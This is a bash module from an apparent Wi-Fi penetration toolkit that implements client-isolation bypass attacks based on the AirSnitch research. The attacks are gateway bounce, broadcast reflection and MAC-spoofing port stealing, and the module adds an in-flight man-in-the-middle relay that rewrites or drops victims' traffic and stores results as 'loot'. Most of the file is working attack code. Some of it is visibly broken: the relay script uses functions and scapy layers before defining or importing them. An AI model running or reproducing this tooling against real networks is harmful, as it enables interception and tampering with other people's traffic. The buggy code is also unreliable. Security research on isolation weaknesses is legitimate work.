#!/usr/bin/env bash
# =====================================================================
#  54_client_isolation.sh — client isolation bypass testing
#
#  Tests whether a network's client isolation can actually be bypassed.
#  Client isolation is not a standardised Wi-Fi feature, so its
#  guarantees vary by vendor and are frequently weaker than assumed.
#
#  Implemented from the AirSnitch work by Mathy Vanhoef et al.
#  (NDSS'26). Three families:
#
#    gateway bounce     isolation enforced at the MAC layer only, so a
#                       packet addressed to the gateway is routed at the
#                       IP layer to another client
#    broadcast reflect  a broadcast Wi-Fi frame carrying a unicast IP
#                       destination, forwarded despite isolation
#    port stealing      spoofing an internal MAC so the network forwards
#                       a victim's traffic to the attacker instead
#
#  A fourth test in the original tool, GTK abuse, needs a MODIFIED
#  wpa_supplicant: upstream does not expose the group key. This module
#  delegates that test when the AirSnitch tree is present, and says so
#  plainly when it is not, rather than reporting a false negative.
#
#  Requires TWO wireless interfaces, both associated — one acting as the
#  victim, one as the attacker. Authorised testing only.
# =====================================================================

set -uo pipefail

SELF="$(readlink -f "${BASH_SOURCE[0]}")"
WIFISTING_ROOT="${WIFISTING_ROOT:-$(cd -P "$(dirname "$SELF")/.." && pwd)}"
export WIFISTING_ROOT

TMP_DIR="${TMP_DIR:-/tmp/wifisting}"
CI_DIR="$TMP_DIR/client_isolation"
CI_LOG_DIR="${CI_LOG_DIR:-$WIFISTING_ROOT/loot/client_isolation}"
CI_AIRSNITCH="${CI_AIRSNITCH:-$WIFISTING_ROOT/external/airsnitch}"

mkdir -p "$CI_DIR" "$CI_LOG_DIR" 2>/dev/null

info() { printf '[info] %s\n' "$*" >&2; }
ok()   { printf '[ok]   %s\n'   "$*" >&2; }
warn() { printf '[warn] %s\n'   "$*" >&2; }
err()  { printf '[err]  %s\n'   "$*" >&2; }
row()  { printf '%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "${4:-}"; }

# ── config ────────────────────────────────────────────────────────────
#
# AirSnitch uses a wpa_supplicant configuration with two network blocks
# tagged by id_str. We accept the same format so a config written for
# their tool works here unchanged, and split it into one single-network
# file per interface — wpa_supplicant will otherwise pick whichever block
# it likes, and both interfaces would join the same network.
ci_check_config() {
    local conf="${1:-}"
    [[ -z "$conf" ]] && { printf 'ERROR\tno config given\n' >&2; return 2; }
    [[ -f "$conf" ]] || { printf 'ERROR\tno such file: %s\n' "$conf" >&2; return 1; }

    local victim attacker
    victim=$(awk '/id_str[[:space:]]*=[[:space:]]*"victim"/{f=1} f&&/^}/{print NR; exit}' "$conf" 2>/dev/null)
    attacker=$(awk '/id_str[[:space:]]*=[[:space:]]*"attacker"/{f=1} f&&/^}/{print NR; exit}' "$conf" 2>/dev/null)

    printf 'CONFIG\t%s\n' "$conf"
    printf 'VICTIM_BLOCK\t%s\n' "${victim:-absent}"
    printf 'ATTACKER_BLOCK\t%s\n' "${attacker:-absent}"

    local rc=0
    [[ -z "$victim"   ]] && { printf 'ERROR\tno network block with id_str="victim"\n'   >&2; rc=1; }
    [[ -z "$attacker" ]] && { printf 'ERROR\tno network block with id_str="attacker"\n' >&2; rc=1; }
    grep -q 'ctrl_interface' "$conf" || \
        warn 'no ctrl_interface line — AirSnitch expects one' >&2

    # SSIDs, so the operator can see what will actually be joined
    awk '
      /id_str[[:space:]]*=[[:space:]]*"(victim|attacker)"/ {
          match($0, /"(victim|attacker)"/); who = substr($0, RSTART+1, RLENGTH-2)
      }
      /ssid[[:space:]]*=/ { s=$0; sub(/.*=[[:space:]]*/, "", s); gsub(/"/, "", s);
                            printf "SSID\t%s\t%s\n", who, s }
    ' "$conf"
    return $rc
}

# Split the master config into one file per role.
ci_split_config() {
    local conf="$1" role="$2" out="$3"
    python3 - "$conf" "$role" "$out" <<'PY'
import re, sys
conf, role, out = sys.argv[1:4]
src = open(conf, encoding="utf-8", errors="replace").read()

head = []
for line in src.splitlines():
    if line.strip().startswith("network={"):
        break
    head.append(line)

blocks = re.findall(r"network\s*=\s*\{(.*?)\n\}", src, re.S)
want = None
for b in blocks:
    if re.search(r'id_str\s*=\s*"%s"' % re.escape(role), b):
        want = b
        break
if want is None:
    sys.stderr.write("ERROR\tno %s block\n" % role)
    sys.exit(1)

with open(out, "w", encoding="utf-8") as fh:
    # start each interface's own control socket so they do not collide
    for line in head:
        if line.strip().startswith("ctrl_interface"):
            fh.write("ctrl_interface=%s_%s\n" % (line.split("=", 1)[1].strip(), role))
        else:
            fh.write(line + "\n")
    fh.write("network={%s\n}\n" % want)
print("WROTE\t%s" % out)
PY
}

# ── interfaces ────────────────────────────────────────────────────────
ci_ifaces() {
    local i
    for i in $(ls /sys/class/net/ 2>/dev/null | grep -E '^wl'); do
        printf '%s\t%s\t%s\n' "$i" \
            "$(iw dev "$i" info 2>/dev/null | awk '/type/{print $2}')" \
            "$(cat "/sys/class/net/$i/address" 2>/dev/null)"
    done
}

# Both interfaces must be associated — these tests operate inside the
# network, not from monitor mode.
ci_require_ifaces() {
    local v="$1" a="$2" bad=0
    for i in "$v" "$a"; do
        [[ -z "$i" ]] && { printf 'ERROR\tno interface given\n' >&2; return 1; }
        [[ -e "/sys/class/net/$i" ]] || {
            printf 'ERROR\t%s does not exist\n' "$i" >&2; bad=1; continue; }
        local t
        t=$(iw dev "$i" info 2>/dev/null | awk '/type/{print $2}')
        if [[ "$t" != "managed" ]]; then
            printf 'ERROR\t%s is in %s mode - these tests need it managed and associated\n' \
                "$i" "${t:-unknown}" >&2
            bad=1
        fi
    done
    (( bad == 0 ))
}

ci_require_root() {
    if [[ ${EUID:-$(id -u)} -ne 0 && -z "${CI_UNPRIVILEGED_TEST:-}" ]]; then
        printf 'ERROR\tthese tests need root - the GUI runs them through pkexec\n' >&2
        printf 'ERROR\tfrom a shell, prefix with sudo\n' >&2
        return 1
    fi
    return 0
}

# ── association ───────────────────────────────────────────────────────
ci_associate() {
    local conf="$1" iface="$2" role="$3"
    local split="$CI_DIR/$role.conf" sock="$CI_DIR/$role.sock"

    ci_split_config "$conf" "$role" "$split" >/dev/null || return 1
    pkill -f "wpa_supplicant .*-i *$iface" 2>/dev/null
    sleep 1
    wpa_supplicant -B -i "$iface" -c "$split" -P "$CI_DIR/$role.pid" \
        > "$CI_LOG_DIR/wpa-$role.log" 2>&1 || {
        printf 'ERROR\tcould not start wpa_supplicant on %s\n' "$iface" >&2
        tail -3 "$CI_LOG_DIR/wpa-$role.log" 2>/dev/null >&2
        return 1
    }
    local i
    for i in $(seq 1 30); do
        if iw dev "$iface" link 2>/dev/null | grep -q 'Connected'; then
            ok "$role associated on $iface" >&2
            return 0
        fi
        sleep 1
    done
    printf 'ERROR\t%s did not associate within 30s\n' "$iface" >&2
    return 1
}

ci_iface_ip()  { ip -4 -o addr show "$1" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1; }
ci_iface_gw()  { ip route show dev "$1" 2>/dev/null | awk '/^default/{print $3; exit}'; }
ci_iface_mac() { cat "/sys/class/net/$1/address" 2>/dev/null; }

# ── the packet-level tests ────────────────────────────────────────────
ci_test_gateway_bounce() {
    local vi="$1" ai="$2"
    local vip; vip=$(ci_iface_ip "$vi")
    local gw;  gw=$(ci_iface_gw "$vi")
    [[ -z "$vip" || -z "$gw" ]] && {
        printf 'ERROR\tvictim has no address or no default route\n' >&2; return 1; }

    printf 'TEST\tgateway bounce\n'
    printf 'VICTIM_IP\t%s\n' "$vip"
    printf 'GATEWAY\t%s\n' "$gw"

    # Listen on the victim for anything arriving that we did not send to
    # it directly. A reply here means isolation is enforced at the MAC
    # layer only and the gateway routed around it.
    local cap="$CI_LOG_DIR/bounce-$(date +%s).pcap"
    timeout 12 tcpdump -i "$vi" -nn -w "$cap" "icmp and src $gw" \
        > /dev/null 2>&1 &
    local tpid=$!
    sleep 2

    # From the attacker: address the frame to the GATEWAY, the IP to the
    # VICTIM. Client isolation sees a packet to the gateway and passes it;
    # the gateway then routes at layer 3.
    python3 - "$ai" "$gw" "$vip" <<'PY'
import sys
from scapy.all import Ether, IP, ICMP, sendp, conf
iface, gw, victim = sys.argv[1:4]
conf.verb = 0
pkt = Ether(dst=gw) / IP(src="10.99.99.99", dst=victim) / ICMP()
sendp(pkt, iface=iface, count=5, inter=0.3, verbose=0)
print("SENT\t5 bounced frame(s) via %s" % gw)
PY
    wait $tpid 2>/dev/null

    local seen=0
    command -v tshark >/dev/null 2>&1 && \
        seen=$(tshark -r "$cap" -Y "icmp" 2>/dev/null | grep -c .)
    printf 'CAPTURED\t%s\n' "$cap"
    if (( seen > 0 )); then
        printf 'VULNERABLE\tgateway bounce succeeded — %s frame(s) reached the victim\n' "$seen"
    else
        printf 'NOT_VULNERABLE\tno bounced traffic reached the victim\n'
    fi
}

ci_test_broadcast_reflect() {
    local vi="$1" ai="$2"
    local vip; vip=$(ci_iface_ip "$vi")
    [[ -z "$vip" ]] && { printf 'ERROR\tvictim has no address\n' >&2; return 1; }

    printf 'TEST\tbroadcast reflection\n'
    printf 'VICTIM_IP\t%s\n' "$vip"

    local cap="$CI_LOG_DIR/bcast-$(date +%s).pcap"
    timeout 12 tcpdump -i "$vi" -nn -w "$cap" "icmp" > /dev/null 2>&1 &
    local tpid=$!
    sleep 2

    # A broadcast Wi-Fi frame whose IP destination is a single victim.
    # Operating systems generally accept unicast IP inside a broadcast
    # L2 frame, so only the addressed client processes it.
    python3 - "$ai" "$vip" <<'PY'
import sys
from scapy.all import Ether, IP, ICMP, sendp, conf
iface, victim = sys.argv[1:3]
conf.verb = 0
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="10.99.99.99", dst=victim) / ICMP()
sendp(pkt, iface=iface, count=5, inter=0.3, verbose=0)
print("SENT\t5 broadcast-wrapped unicast frame(s)")
PY
    wait $tpid 2>/dev/null

    local seen=0
    command -v tshark >/dev/null 2>&1 && \
        seen=$(tshark -r "$cap" -Y "icmp" 2>/dev/null | grep -c .)
    printf 'CAPTURED\t%s\n' "$cap"
    if (( seen > 0 )); then
        printf 'VULNERABLE\tbroadcast reflection succeeded — %s frame(s) reached the victim\n' "$seen"
    else
        printf 'NOT_VULNERABLE\tno reflected traffic reached the victim\n'
    fi
}

ci_test_port_steal() {
    local vi="$1" ai="$2" mode="$3"

    printf 'TEST\tport stealing (%s)\n' "$mode"
    local vmac; vmac=$(ci_iface_mac "$vi")
    local gw;   gw=$(ci_iface_gw "$vi")
    printf 'VICTIM_MAC\t%s\n' "$vmac"
    printf 'GATEWAY\t%s\n' "${gw:-unknown}"

    if [[ "$mode" == "downlink" ]]; then
        # Spoof the victim's MAC from the attacker so the network's
        # forwarding table points the victim's downlink at us.
        python3 - "$ai" "$vmac" "$gw" <<'PY'
import sys
from scapy.all import Ether, IP, ICMP, sendp, conf
iface, vmac, gw = sys.argv[1:4]
conf.verb = 0
# bogus traffic claiming to be the victim, which re-points the bridge
pkt = Ether(src=vmac, dst=gw) / IP(src="10.99.99.99", dst="10.99.99.98") / ICMP()
sendp(pkt, iface=iface, count=20, inter=0.2, verbose=0)
print("SENT\t20 spoofed frame(s) as the victim's MAC")
PY
    else
        # Spoof the GATEWAY's MAC so the victim's uplink is sent to us.
        local gmac
        gmac=$(ip neigh show "$gw" dev "$vi" 2>/dev/null | awk '{print $5; exit}')
        [[ -z "$gmac" ]] && gmac=$(arping -c 2 -I "$vi" "$gw" 2>/dev/null | \
            grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
        printf 'GATEWAY_MAC\t%s\n' "${gmac:-unresolved}"
        [[ -z "$gmac" ]] && {
            printf 'ERROR\tcould not resolve the gateway MAC — try again once associated\n' >&2
            return 1
        }
        python3 - "$ai" "$gmac" <<'PY'
import sys
from scapy.all import Ether, IP, ICMP, sendp, conf
iface, gmac = sys.argv[1:3]
conf.verb = 0
pkt = Ether(src=gmac, dst="ff:ff:ff:ff:ff:ff") / IP(src="10.99.99.97", dst="10.99.99.96") / ICMP()
sendp(pkt, iface=iface, count=20, inter=0.2, verbose=0)
print("SENT\t20 spoofed frame(s) as the gateway's MAC")
PY
    fi
    printf 'NOTE\toutcome needs observation on the victim — watch its counters\n'
    printf 'NOTE\tthis test manipulates forwarding tables; traffic may be disrupted\n'
}

# ── inter-NIC relaying ────────────────────────────────────────────────
#
# The tests above tell you the network is vulnerable. This maintains the
# bypass: frames arriving on one interface are put back out the other, so
# the victim keeps talking while the traffic passes through us.
#
# Scapy rather than a kernel bridge, deliberately. A bridge merges the two
# L2 domains wholesale, which drags our own traffic and addressing into
# the path and breaks the moment the two interfaces sit on networks with
# different security. Forwarding frame by frame keeps the two sides
# separate and lets us rewrite the addresses the network expects.
# ── traffic rewrite ───────────────────────────────────────────────────
#
# The relay moved frames between interfaces; this changes them in flight.
# That is the difference between watching an exchange and taking part in
# it: a forwarded HTTP request can be pointed somewhere else, a response
# body altered, a probe answered with something it did not ask for.
#
# RULES ARE PLAIN STRING MATCHES, DELIBERATELY
#   replace <text> <replacement>   substitute, anywhere in the frame
#   drop    <text>                 do not forward frames containing it
#
# A rule that matched on protocol fields would be more precise and much
# harder to reason about, and the failure mode of a wrong rule here is
# silently corrupting someone's traffic. Plain substrings are predictable:
# you can see exactly what will and will not match.
#
# WHAT IT DOES NOT DO
# There is no reassembly. A match must fall inside one frame, so a string
# spanning a TCP segment boundary will not be caught. That is a real
# limitation and the reason the counter reports frames changed rather
# than claiming a session was rewritten.
CI_RULES="$CI_DIR/rewrite.tsv"

ci_rewrite_add() {
    local action="${1:-}" match="${2:-}" repl="${3:-}"
    case "$action" in
        replace|drop) ;;
        *) printf 'ERROR\tusage: --rewrite-add replace|drop MATCH [REPLACEMENT]\n' >&2; return 2 ;;
    esac
    [[ -z "$match" ]] && {
        printf 'ERROR\tno match text given\n' >&2; return 2; }
    if [[ "$action" == "replace" && -z "$repl" ]]; then
        printf 'ERROR\treplace needs a replacement (use drop to remove)\n' >&2
        return 2
    fi
    [[ "$match" == *$'\t'* || "$repl" == *$'\t'* ]] && {
        printf 'ERROR\ttabs are the field separator - they cannot appear in a rule\n' >&2
        return 2
    }

    mkdir -p "$CI_DIR" 2>/dev/null
    printf '%s\t%s\t%s\n' "$action" "$match" "$repl" >> "$CI_RULES"
    printf 'ADDED\t%s\t%s\t%s\n' "$action" "$match" "$repl"
}

ci_rewrite_list() {
    printf 'ACTION\tMATCH\tREPLACEMENT\n'
    [[ -s "$CI_RULES" ]] && cat "$CI_RULES"
    return 0
}

ci_rewrite_clear() {
    local n=0
    [[ -s "$CI_RULES" ]] && n=$(wc -l < "$CI_RULES")
    : > "$CI_RULES" 2>/dev/null
    printf 'CLEARED\t%s\n' "$n"
}

ci_relay_py() {
    cat <<'PY'
import os, sys, time, threading
from scapy.all import sniff, sendp, Ether, conf

iface_a, iface_b, secs, status = sys.argv[1:5]
secs = int(secs)
conf.verb = 0

counts = {"a2b": 0, "b2a": 0, "dropped": 0, "rewritten": 0}
rules = load_rules(os.environ.get("CI_RULES", ""))
stop_at = time.time() + secs if secs > 0 else 0
lock = threading.Lock()

def mac_of(i):
    with open("/sys/class/net/%s/address" % i) as fh:
        return fh.read().strip()

mac_a, mac_b = mac_of(iface_a), mac_of(iface_b)

def write_status():
    with lock:
        tmp = status + ".tmp"
        with open(tmp, "w") as fh:
            fh.write("forwarded_a2b\t%d\n" % counts["a2b"])
            fh.write("forwarded_b2a\t%d\n" % counts["b2a"])
            fh.write("rewritten\t%d\n" % counts["rewritten"])
            fh.write("dropped\t%d\n" % counts["dropped"])
            fh.write("elapsed\t%d\n" % int(time.time() - start))
            fh.write("running\t%d\n" % (0 if (stop_at and time.time() > stop_at) else 1))
        os.replace(tmp, status)

def load_rules(path):
    """Read the rule file. Absent or unreadable means no rules, not an error."""
    rules = []
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                parts = line.rstrip("\n").split("\t")
                if len(parts) >= 2 and parts[0] in ("replace", "drop"):
                    repl = parts[2] if len(parts) > 2 else ""
                    rules.append((parts[0], parts[1].encode(), repl.encode()))
    except OSError:
        pass
    return rules


def apply_rules(p, rules):
    """Modify P in place. Returns "drop" if a rule says so, else "forward".

    Checksums are dropped after a change so scapy recomputes them. Leaving
    a stale checksum is worse than not rewriting at all: the receiver
    discards the frame and the connection stalls with no clue why.
    """
    for action, match, repl in rules:
        raw = bytes(p)
        if match not in raw:
            continue
        if action == "drop":
            return "drop"

        # Replace inside the payload rather than over the whole frame, so
        # a match in a header does not corrupt the header.
        for layer in (TCP, UDP):
            if not p.haslayer(layer):
                continue
            body = bytes(p[layer].payload)
            if match in body:
                p[layer].payload = Raw(load=body.replace(match, repl))
                del p[layer].chksum
                if p.haslayer(IP):
                    del p[IP].chksum
                with lock:
                    counts["rewritten"] += 1
                return "forward"
    return "forward"


def relay(pkt, out_iface, out_mac, key, rules):
    # Rewrite the source to the outgoing interface's address, or the
    # network drops the frame as a spoofed foreign MAC.
    try:
        p = pkt.copy()
        if p.haslayer(Ether):
            p[Ether].src = out_mac
        if rules and apply_rules(p, rules) == "drop":
            with lock:
                counts["dropped"] += 1
            return
        sendp(p, iface=out_iface, verbose=0)
        with lock:
            counts[key] += 1
    except Exception:
        pass

def sniff_a():
    sniff(iface=iface_a, prn=lambda p: relay(p, iface_b, mac_b, "a2b", rules),
          store=0, stop_filter=lambda _: stop_at and time.time() > stop_at)

def sniff_b():
    sniff(iface=iface_b, prn=lambda p: relay(p, iface_a, mac_a, "b2a", rules),
          store=0, stop_filter=lambda _: stop_at and time.time() > stop_at)

start = time.time()
ta = threading.Thread(target=sniff_a, daemon=True)
tb = threading.Thread(target=sniff_b, daemon=True)
ta.start(); tb.start()

while ta.is_alive() or tb.is_alive():
    write_status()
    time.sleep(1)
write_status()
print("RELAY_STOPPED\ta2b=%d b2a=%d rewritten=%d dropped=%d"
      % (counts["a2b"], counts["b2a"], counts["rewritten"], counts["dropped"]))
PY
}

ci_cli_relay() {
    local conf="${1:-}" vi="${2:-}" ai="${3:-}" secs="${4:-0}"
    ci_require_root || return 1
    ci_require_ifaces "$vi" "$ai" || return 1

    if [[ -f "$CI_DIR/relay.pid" ]] && [[ -d "/proc/$(cat "$CI_DIR/relay.pid" 2>/dev/null)" ]]; then
        printf 'ERROR\trelay already running (pid %s) - stop it first\n' \
            "$(cat "$CI_DIR/relay.pid")" >&2
        return 1
    fi

    if [[ -n "$conf" ]]; then
        ci_check_config "$conf" >/dev/null || return 1
        ci_associate "$conf" "$vi" victim   || return 1
        ci_associate "$conf" "$ai" attacker || return 1
    fi

    printf 'RELAY\tstarting\n'
    printf 'VICTIM_IFACE\t%s\n' "$vi"
    printf 'ATTACKER_IFACE\t%s\n' "$ai"
    printf 'DURATION\t%s\n' "$( (( secs > 0 )) && echo "${secs}s" || echo until-stopped )"
    printf 'NOTE\trewrites source MAC per interface; forwards both directions\n'
    printf 'NOTE\ttraffic now passes through this host — expect latency\n'

    ci_relay_py > "$CI_DIR/relay.py"
    setsid env CI_RULES="$CI_RULES" \
        python3 "$CI_DIR/relay.py" "$vi" "$ai" "$secs" "$CI_DIR/relay.status" \
        > "$CI_LOG_DIR/relay.log" 2>&1 &
    echo $! > "$CI_DIR/relay.pid"
    sleep 3
    printf 'PID\t%s\n' "$(cat "$CI_DIR/relay.pid")"
    printf 'STATUS\t%s\n' "$CI_DIR/relay.status"
    [[ -s "$CI_DIR/relay.status" ]] && cat "$CI_DIR/relay.status" | sed 's/^/  /'
}

ci_cli_relay_status() {
    if [[ -s "$CI_DIR/relay.status" ]]; then
        cat "$CI_DIR/relay.status"
    else
        printf 'running\t0\n'
        printf 'INFO\tno relay has run yet\n'
    fi
}


# ── GTK test ──────────────────────────────────────────────────────────
#
# Delegated, not reimplemented. Reading the group key requires a patched
# wpa_supplicant — upstream never exposes it. Reimplementing the crypto
# here would only reproduce the part that already works.
ci_test_gtk() {
    local conf="$1" vi="$2" ai="$3"
    printf 'TEST\tGTK abuse\n'

    if [[ -x "$CI_AIRSNITCH/airsnitch/research/airsnitch.py" ]]; then
        printf 'DELEGATED\t%s/airsnitch/research/airsnitch.py\n' "$CI_AIRSNITCH"
        printf 'NOTE\trun: sudo ./airsnitch.py %s --check-gtk-shared %s --no-ssid-check\n' "$ai" "$vi"
        return 0
    fi

    printf 'UNAVAILABLE\tAirSnitch tree not found at %s\n' "$CI_AIRSNITCH"
    printf 'REASON\treading the GTK needs a patched wpa_supplicant; upstream does not expose it\n'
    printf 'REASON\tthe packet-level tests here need no patch and cover the other three families\n'
    printf 'HINT\tclone https://github.com/vanhoefm/airsnitch and run ./setup.sh, then set CI_AIRSNITCH\n'
    return 0
}

# ── CLI ───────────────────────────────────────────────────────────────
ci_cli_test() {
    local kind="$1" conf="$2" vi="$3" ai="$4" extra="${5:-}"
    ci_require_root || return 1
    ci_require_ifaces "$vi" "$ai" || return 1

    printf 'VICTIM_IFACE\t%s\n' "$vi"
    printf 'ATTACKER_IFACE\t%s\n' "$ai"

    if [[ -n "$conf" ]]; then
        ci_check_config "$conf" >/dev/null || return 1
        ci_associate "$conf" "$vi" victim  || return 1
        ci_associate "$conf" "$ai" attacker || return 1
    else
        warn 'no --config: using interfaces as already associated' >&2
    fi

    case "$kind" in
        gtk)       ci_test_gtk "$conf" "$vi" "$ai" ;;
        bounce)    ci_test_gateway_bounce "$vi" "$ai" ;;
        broadcast) ci_test_broadcast_reflect "$vi" "$ai" ;;
        steal)     ci_test_port_steal "$vi" "$ai" "${extra:-downlink}" ;;
    esac
}

ci_cli_status() {
    printf 'running\t%s\n' "$( [[ -f "$CI_DIR/victim.pid" || -f "$CI_DIR/attacker.pid" ]] && echo 1 || echo 0)"
    printf 'iface_count\t%s\n' "$(ci_ifaces | wc -l)"
    printf 'airsnitch_tree\t%s\n' "$( [[ -x "$CI_AIRSNITCH/airsnitch/research/airsnitch.py" ]] && echo present || echo absent)"
    printf 'loot_dir\t%s\n' "$CI_LOG_DIR"
}

ci_cli_stop() {
    local n=0
    for r in victim attacker; do
        [[ -f "$CI_DIR/$r.pid" ]] && {
            kill "$(cat "$CI_DIR/$r.pid")" 2>/dev/null && n=$((n+1))
            rm -f "$CI_DIR/$r.pid"
        }
    done
    pkill -f 'wpa_supplicant .*client_isolation' 2>/dev/null && n=$((n+1))
    if [[ -f "$CI_DIR/relay.pid" ]]; then
        kill "$(cat "$CI_DIR/relay.pid")" 2>/dev/null && n=$((n+1))
        rm -f "$CI_DIR/relay.pid"
    fi
    pkill -f 'client_isolation/relay.py' 2>/dev/null && n=$((n+1))
    printf 'STOPPED\t%s\n' "$n"
}

ci_cli_selftest() {
    chk() {
        if [[ "$2" == "$3" ]]; then printf '%s\tPASS\n' "$1"
        else printf '%s\tFAIL\twant=%s got=%s\n' "$1" "$3" "$2"; fi
    }

    # a well-formed config is accepted
    local c="$CI_DIR/selftest.conf"
    cat > "$c" <<'CONF'
ctrl_interface=wpaspy_ctrl
network={
    id_str="victim"
    ssid="main-network"
    psk="pw"
}
network={
    id_str="attacker"
    ssid="guest-network"
    psk="pw"
}
CONF
    ci_check_config "$c" >/dev/null 2>&1
    [[ $? -eq 0 ]] && chk config-accepts-good rc-ok rc-ok || chk config-accepts-good rc-bad rc-ok

    # a config missing a role is refused
    printf 'network={\n id_str="victim"\n ssid="x"\n}\n' > "$CI_DIR/selftest-bad.conf"
    ci_check_config "$CI_DIR/selftest-bad.conf" >/dev/null 2>&1
    [[ $? -ne 0 ]] && chk config-rejects-missing-role rc-bad rc-bad \
                   || chk config-rejects-missing-role rc-ok rc-bad

    # splitting produces one block per role, with distinct control sockets
    ci_split_config "$c" victim "$CI_DIR/v.conf" >/dev/null 2>&1
    chk split-victim-blocks "$(grep -c '^network=' "$CI_DIR/v.conf" 2>/dev/null)" "1"
    ci_split_config "$c" attacker "$CI_DIR/a.conf" >/dev/null 2>&1
    chk split-attacker-blocks "$(grep -c '^network=' "$CI_DIR/a.conf" 2>/dev/null)" "1"
    chk split-sockets-differ \
        "$(grep -q 'victim' "$CI_DIR/v.conf" && grep -q 'attacker' "$CI_DIR/a.conf" && echo ok)" "ok"

    # a monitor-mode interface is refused for these tests
    CI_UNPRIVILEGED_TEST=1 ci_require_ifaces "nosuchif0" "nosuchif1" >/dev/null 2>&1
    [[ $? -ne 0 ]] && chk refuses-missing-iface rc-bad rc-bad \
                   || chk refuses-missing-iface rc-ok rc-bad

    # GTK must report unavailable rather than silently passing
    CI_AIRSNITCH=/nonexistent ci_test_gtk "" "" "" 2>/dev/null | grep -q UNAVAILABLE
    [[ $? -eq 0 ]] && chk gtk-reports-unavailable ok ok || chk gtk-reports-unavailable bad ok

    # ── traffic rewrite ───────────────────────────────────────────────
    # Rules live in the real CI_DIR, so point it somewhere disposable and
    # put it back afterwards.
    local save_rules="$CI_RULES"
    CI_RULES="$CI_DIR/st-rewrite.tsv"
    : > "$CI_RULES"

    ci_rewrite_add replace "example.com" "evil.test" >/dev/null
    chk rewrite-add-stores "$(wc -l < "$CI_RULES")" "1"
    chk rewrite-add-fields "$(awk -F'\t' '{print NF}' "$CI_RULES")" "3"

    ci_rewrite_add drop "telemetry" >/dev/null
    chk rewrite-add-second "$(wc -l < "$CI_RULES")" "2"

    local out
    out=$(ci_rewrite_add bogus x 2>&1); chk rewrite-rejects-bad-action "$?" "2"
    out=$(ci_rewrite_add replace "" 2>&1); chk rewrite-rejects-empty-match "$?" "2"
    out=$(ci_rewrite_add replace "a" 2>&1); chk rewrite-needs-replacement "$?" "2"

    # A tab is the field separator and cannot appear inside a rule, or the
    # file stops round-tripping.
    out=$(ci_rewrite_add replace "a$(printf '\t')b" c 2>&1)
    chk rewrite-rejects-tab "$?" "2"

    out=$(ci_rewrite_list)
    grep -q 'example.com' <<<"$out" && chk rewrite-list-shows-rules ok ok \
                                    || chk rewrite-list-shows-rules no ok

    ci_rewrite_clear >/dev/null
    chk rewrite-clear-empties "$(wc -l < "$CI_RULES")" "0"

    rm -f "$CI_RULES"
    CI_RULES="$save_rules"
}

case "${1:-}" in
    --check-config)  shift; ci_check_config "$@" ;;
    --ifaces-tsv)    ci_ifaces ;;
    --gtk-shared)    shift; ci_cli_test gtk       "$@" ;;
    --c2c-ip)        shift; ci_cli_test bounce    "$@" ;;
    --c2c-broadcast) shift; ci_cli_test broadcast "$@" ;;
    --port-steal)    shift; ci_cli_test steal     "$@" ;;
    --relay)         shift; ci_cli_relay "$@" ;;
    --rewrite-add)   shift; ci_rewrite_add "$@" ;;
    --rewrite-list)  ci_rewrite_list ;;
    --rewrite-clear) ci_rewrite_clear ;;
    --relay-status-tsv) ci_cli_relay_status ;;
    --status-tsv)    ci_cli_status ;;
    --stop)          ci_cli_stop ;;
    --selftest)      ci_cli_selftest ;;
    --info)
        printf 'Client isolation bypass testing (from the AirSnitch work)\n'
        printf 'Tests gateway bouncing, broadcast reflection and port stealing.\n'
        printf 'Needs TWO associated interfaces. Authorised testing only.\n'
        ;;
    --help|"")
        printf 'Usage: modules/54_client_isolation.sh COMMAND\n'
        printf '  --check-config CONF\n'
        printf '  --ifaces-tsv\n'
        printf '  --gtk-shared    CONF VICTIM_IFACE ATTACKER_IFACE\n'
        printf '  --c2c-ip        CONF VICTIM_IFACE ATTACKER_IFACE\n'
        printf '  --c2c-broadcast CONF VICTIM_IFACE ATTACKER_IFACE\n'
        printf '  --port-steal    CONF VICTIM_IFACE ATTACKER_IFACE [downlink|uplink]\n'
        printf '  --relay CONF VICTIM_IFACE ATTACKER_IFACE [SECONDS]\n'
        printf '  --relay-status-tsv
'
        printf '  --status-tsv / --stop / --selftest\n'
        ;;
    *) printf 'ERROR\tunknown command: %s\n' "$1" >&2; exit 2 ;;
esac
